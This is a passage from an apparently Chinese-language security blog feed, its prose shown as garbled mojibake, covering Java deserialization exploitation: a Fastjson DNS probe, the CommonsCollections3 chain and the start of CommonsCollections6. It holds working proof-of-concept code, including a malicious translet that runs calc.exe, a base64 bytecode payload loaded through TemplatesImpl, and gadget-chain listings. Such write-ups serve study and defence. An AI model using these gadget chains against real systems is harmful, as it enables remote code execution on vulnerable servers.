alt="image-20230511153442924"></p><p>åˆ©ç”¨ç±»åŠ è½½å™¨åŠ è½½ç±»ï¼Œç„¶åå°†å¯¹ç±»ç¼“å­˜åˆ°mapingå¯¹è±¡ä¸­</p><p><img src="https://img.katck.com/images/2023/05/11/5801dffe39b1758539a3da4428c613ba.png" alt="image-20230510225836724"></p><p>è¿è¡Œè‡³deserializer.deserialze(this, clazz, fieldName);</p><p><img src="https://img.katck.com/images/2023/05/11/9995d68c6cdeb72d00f27653c29ebba2.png" alt="image-20230511154421506"></p><p>Fastjsonå¯¹äºInetAddressç±»ä¼šä½¿ç”¨MiscCodecè¿™ä¸ªObjectDeserializeræ¥ååºåˆ—åŒ–</p><p>è¿›å…¥MiscCodec#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName)</p><p>ç»è¿‡å¤§é‡çš„åˆ¤æ–­åè°ƒç”¨InetAddress.getByName(strVal)ï¼›è¿™é‡Œå°±ä¼šè¿›è¡Œä¸€æ¬¡DNSè¯·æ±‚ï¼Œå®ŒæˆDNSæ¢æµ‹</p><p><img src="https://img.katck.com/images/2023/05/11/331091ad054d509b5364afeeb8a6aa9d.png" alt="image-20230511154613730"></p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
      <tag>Fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections3</title>
    <link href="/2023/05/10/CommonsCollections3/"/>
    <url>/2023/05/10/CommonsCollections3/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>éšç€Javaååºåˆ—åŒ–å·¥å…·ysoserialçš„ç«çˆ†ï¼Œå¼€å‘è€…ä¹Ÿåœ¨å¯»æ‰¾é˜²å¾¡çš„æ–¹å¼ã€‚é€šè¿‡é»‘åå•ä¸ç™½åå•çš„æ–¹å¼æ¥é™åˆ¶ååºåˆ—åŒ–æ—¶å…è®¸é€šè¿‡çš„ç±»å°±æ˜¯å¸¸è§çš„æ–¹å¼ã€‚</p><p>CommonsCollections3åœ¨InvokerTransformerè¢«è¿‡æ»¤çš„æƒ…å†µä¸‹è¯ç”Ÿï¼Œç”¨äºç»•è¿‡ä¸€äº›è§„åˆ™å¯¹InvokerTransformerçš„é™åˆ¶ã€‚</p><p><strong>ysoserialçš„cc3ä»‹ç»</strong></p><blockquote><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">* Variation <span class="hljs-keyword">on</span> CommonsCollections1 <span class="hljs-keyword">that</span> uses InstantiateTransformer <span class="hljs-keyword">instead of</span><br>* InvokerTransformer.<br></code></pre></td></tr></table></figure></blockquote><h3 id="åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç </h3><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>è¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»<code>TransletClassLoader</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    TransletClassLoader(ClassLoader parent) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>    &#125;<br><br>    Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.defineClass((String)<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç±»é‡å†™äº†<code>defineClass</code>æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾å¼åœ°å£°æ˜å…¶å®šä¹‰åŸŸã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨Javaä¸­ï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æ²¡æœ‰æ˜¾å¼å£°æ˜ä½œç”¨åŸŸï¼Œå…¶ä½œç”¨åŸŸä¸ºdefaultã€‚</p><p>æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„<code>defineClass</code>ç”±å…¶çˆ¶ç±»çš„protectedç±»å‹å˜æˆäº†ä¸€ä¸ªdefaultç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚</p><p>å“ªé‡Œå¯ä»¥è°ƒç”¨<code>TransletClassLoader.defineClass()</code>å‘¢ï¼Ÿ</p><p>ä»<code>TransletClassLoader.defineClass()</code>å‘å‰è¿½æº¯ä¸€ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">TemplatesImpl.getOutputProperties<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> TemplatesImpl.newTransformer<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span><br>TemplatesImpl.getTransletInstance<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> TemplatesImpl.defineTransletClasses<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span> TransletClassLoader.defineClass()<br></code></pre></td></tr></table></figure><p><code>TemplatesImpl.getOutputProperties()</code>å’Œ<code>TemplatesImpl.newTransformer()</code>éƒ½æ˜¯publicçš„ï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨ã€‚æˆ‘ä»¬å°è¯•ä½¿ç”¨newTransformer()æ„é€ ä¸€ä¸ªç®€å•çš„POCï¼š</p><p><strong>åˆ›å»ºæ¶æ„ç±»ï¼š</strong></p><p>æ¶æ„ç±»éœ€è¦ç»§æ‰¿è‡ª<code>AbstractTranslet</code>ï¼Œè¿™é‡Œåœ¨æ„é€ å‡½æ•°ä¸­æ‰“å¼€ä¸€ä¸ªè®¡ç®—å™¨ï¼Œå°†å…¶ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œæ”¾åˆ°<code>TemplatesImpl</code>ä¸­æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Shell</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>newTransformer()ç®€å•POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] shell = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQATTG9yZy9leGFtcGxlL1NoZWxsOwEADVN0YWNrTWFwVGFibGUHACsHACkBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAClNoZWxsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEAEW9yZy9leGFtcGxlL1NoZWxsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAfAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAwAMAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAFQASAA0AAAAWAAIAEQAEAA4ADwABAAAAFgAQABEAAAASAAAAEAAC/wAQAAEHABMAAQcAFAQAAQAVABYAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABYADQAAACAAAwAAAAEAEAARAAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB0AAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACoABAAAAAEAEAARAAAAAAABABcAGAABAAAAAQAeAB8AAgAAAAEAIAAhAAMAGwAAAAQAAQAcAAEAIgAAAAIAIw==&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(tmp, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;shell&#125;);<br>        setFieldValue(tmp, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Shell&quot;</span>);<br>        setFieldValue(tmp, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        tmp.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>setFieldValue()</code>ç”¨äºè®¾ç½®ç§æœ‰å±æ€§ï¼Œ<code>_bytecodes</code>æ˜¯ç”±å­—èŠ‚ç ç»„æˆçš„æ•°ç»„ï¼›<code>_name</code>æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œè¦æ±‚ä¸èƒ½ä¸ºnullï¼›<code>_tfactory</code>éœ€è¦ä¸€ä¸ª<code>TransformerFactoryImpl</code>å¯¹è±¡ï¼Œå› ä¸º<code>TemplatesImpl.defineTransletClasses()</code> æ–¹æ³•é‡Œæœ‰è°ƒç”¨åˆ° <code>_tfactory.getExternalExtensionsMap()</code> ï¼Œå¦‚æœä¸ºnullä¼šå‡ºé”™</p><p><img src="https://img.katck.com/images/2023/05/10/77b762af49a04568dc7b3b4fbd1c9f80.png" alt="image-20230510143057787"></p><h3 id="CommonsCollection3"><a href="#CommonsCollection3" class="headerlink" title="CommonsCollection3"></a>CommonsCollection3</h3><p>CommonsCollection3ä¸­åˆ©ç”¨äº†<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p><p>è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº†<code>(TransformerImpl) templates.newTransformer()</code>ï¼Œè®©æˆ‘ä»¬å¯ä»¥åˆ©ç”¨TemplatesImplåˆ©ç”¨é“¾</p><p><img src="https://img.katck.com/images/2023/05/10/978369abed3f5885f12ff8b5507e1e28.png" alt="image-20230510145330515"></p><p>å¦‚ä½•åœ¨æ²¡æœ‰InvokerTransformerçš„æƒ…å†µä¸‹è°ƒç”¨TrAXFilterçš„æ„é€ æ–¹æ³•å‘¢ï¼Ÿ</p><p>ysoserialä½¿ç”¨äº†ä¸€ä¸ªæ–°çš„Transformerï¼š<code>org.apache.commons.collections.functors.InstantiateTransformer</code>ï¼ŒInstantiateTransformeræ˜¯å®ç°äº†Transformeræ¥å£çš„ç±»ï¼Œä»–çš„ä½œç”¨å°±æ˜¯è°ƒç”¨æ„é€ æ–¹æ³•ã€‚</p><p>æ‰€ä»¥åˆ©ç”¨æ€è·¯å°±æ¸…æ™°äº†ï¼šåˆ©ç”¨<code>InstantiateTransformer</code>è°ƒç”¨<code>TrAXFilter</code>çš„æ„é€ æ–¹æ³•ï¼Œå†åˆ©ç”¨æ„é€ æ–¹æ³•ä¸­çš„<code>templates.newTransformer()</code>è°ƒç”¨<code>TemplatesImpl</code>ä¸­çš„å­—èŠ‚ç ã€‚</p><p><strong>Transformerè°ƒç”¨é“¾ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; tmp &#125;<br>    )<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://img.katck.com/images/2023/05/10/95de61aa31d5565e1de0f3c452cb3c35.png" alt="image-20230510151538721"></p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections6</title>
    <link href="/2023/05/07/CommonsCollections6/"/>
    <url>/2023/05/07/CommonsCollections6/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ysoserialä¸­ï¼ŒCommonsCollections6æ˜¯æ¯”è¾ƒé€šç”¨çš„ï¼Œåœ¨é«˜ç‰ˆæœ¬Javaä¸­ä¹Ÿå¯ä»¥åˆ©ç”¨ã€‚</p><h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><p><strong>ysoserial Gadget</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">    java.io.ObjectInputStream.readObject()</span><br><span class="hljs-comment">            java.util.HashSet.readObject()</span><br><span class="hljs-comment">                java.util.HashMap.put()</span><br><span class="hljs-comment">                java.util.HashMap.hash()</span><br><span class="hljs-comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="hljs-comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="hljs-comment">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="hljs-comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="hljs-comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="hljs-comment">                            java.lang.reflect.Method.invoke()</span><br><span class="hljs-comment">                                java.lang.Runtime.exec()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    by @matthias_kaiser</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="æ€»ä½“æ€è·¯"><a href="#æ€»ä½“æ€è·¯" class="headerlink" title="æ€»ä½“æ€è·¯"></a>æ€»ä½“æ€è·¯</h3><p>åœ¨Java 8u71ä»¥åï¼Œ<code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()</code>çš„é€»è¾‘å˜åŒ–äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨äºè§¦å‘LazyMapåˆ©ç”¨é“¾ã€‚</p><p>cc6å°±æ˜¯å¦è¾Ÿè¹Šå¾„ï¼Œæ‰¾åˆ°äº†å…¶ä»–è°ƒç”¨<code>LazyMap.get()</code>çš„æ–¹æ³•ï¼Œä»¥æ­¤æ¥è°ƒç”¨LazyMapåˆ©ç”¨é“¾</p><p>ysoserialæ‰¾åˆ°äº†<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>ï¼Œå®ƒçš„æ–¹æ³•æœ‰è¿™æ ·çš„è°ƒç”¨å…³ç³»<code>hashCode() =&gt; getValue() =&gt; this.map.get()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry, KeyValue, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8453869361373831205L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object key;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.map.get(<span class="hljs-built_in">this</span>.key);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getValue();<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-built_in">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°åœ¨é—®é¢˜å°±è½¬æ¢æˆå“ªé‡Œå¯ä»¥è°ƒç”¨åˆ°<code>TiedMapEntry.hashCode</code>äº†</p><h4 id="pç¥çš„ç®€åŒ–Gadget"><a href="#pç¥çš„ç®€åŒ–Gadget" class="headerlink" title="pç¥çš„ç®€åŒ–Gadget"></a>pç¥çš„ç®€åŒ–Gadget</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Gadget chain:</span><br><span class="hljs-comment">     java.io.ObjectInputStream.readObject()</span><br><span class="hljs-comment">     java.util.HashMap.readObject()</span><br><span class="hljs-comment">     java.util.HashMap.hash()</span><br><span class="hljs-comment">    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="hljs-comment">    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="hljs-comment">     org.apache.commons.collections.map.LazyMap.get()</span><br><span class="hljs-comment">                    org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="hljs-comment">                    org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="hljs-comment">                    java.lang.reflect.Method.invoke()</span><br><span class="hljs-comment">                       java.lang.Runtime.exec()</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>ä¸»è¦çš„åŒºåˆ«å°±æ˜¯ysoserialä¸­ï¼Œåˆ©ç”¨<code>java.util.HashSet.readOject =&gt; HashMap.put() =&gt; HashMap.hash(key) =&gt; TiedMapEntry.hashCode()</code></p><p>pç¥å‘ç°äº†<code>java.util.HashMap.readObject() =&gt; HashMap.hash() =&gt; TiedMapEntry.hashCode()</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;<br>    <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br>    <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        ......<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    